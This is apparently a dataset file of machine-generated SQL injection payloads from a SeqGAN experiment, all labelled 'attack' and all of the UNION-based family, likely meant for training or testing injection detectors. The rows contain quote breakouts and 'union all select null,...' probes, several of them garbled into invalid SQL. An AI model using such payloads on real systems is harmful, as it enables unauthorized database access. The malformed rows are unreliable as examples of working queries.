label,payload,family,payload_type,method,run_id,sample_index
attack,"-6097'%   union all u  =  )    )    )    union all all all all all all null,1224,1224,9322,1441,4854,1441,7348,9988,8123,1224#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,0
attack,--4266%'  )   union all all us',union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,1
attack,"-4589""  )    )    union select from -- users",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,2
attack,",4600, --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,3
attack,"-5945"" \union all from where users )    as 9517 from id    1 $  (    )  )    union all all 1,5349--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,4
attack,"-'  )    )    )    union all N 1494,2446,versunion @EE,),veers users id  =  1 union all all select 5756,1441,4300,7348,7348,8123,4854,5756,9921,5349,7348,9921,9814,1441,8986#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,5
attack,"-""  )     )    )    )     )   union all all all select null,8123,2263,5756,8123,7348,5756--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,6
attack,-9860,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,7
attack,"-'s union all select ,null,4266,7348,8665,7348,7348,5756,4854,4854#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,8
attack,"-""  )  )     )   union select --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,9
attack,"-4909''  )   a union all all all all * I union where --,version  n  8268 bs'  =  9517  1 where   all  all select null,3339,1249,9357,1249,3990,6996,1249,1249,1249,1249'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,10
attack,-7296%'  )     )    )    union 2011 union all select  from us@@V,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,11
attack,"-5575""$ union all select null,null,null,9814--,3072,7348,9921,4854#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,12
attack,"-)   union all all esers ,vnullrs us us'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,13
attack,"-4542 union all all all 5756,9988,7348,7348,4854,3339#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,14
attack,"8073'  )   )    )    union all select null,2263,3059,8123,8123,8123,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,15
